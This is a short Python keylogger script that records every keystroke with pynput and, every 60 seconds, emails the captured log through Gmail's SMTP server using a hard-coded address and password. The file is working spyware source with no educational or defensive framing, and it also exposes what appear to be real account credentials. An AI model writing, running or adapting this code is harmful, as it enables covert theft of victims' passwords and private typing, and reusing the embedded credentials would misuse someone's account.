#!/env/bin/env python

import pynput.keyboard
import threading
import smtplib
import keylogger

class Keylogger:
    def __init__(self):
        self.log = "Keylogger Started"

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail("suhailsaifi7533@gmail.com", "rxprhrmywhpovdvl", "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(60, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

slogger = keylogger.Keylogger()
slogger.start()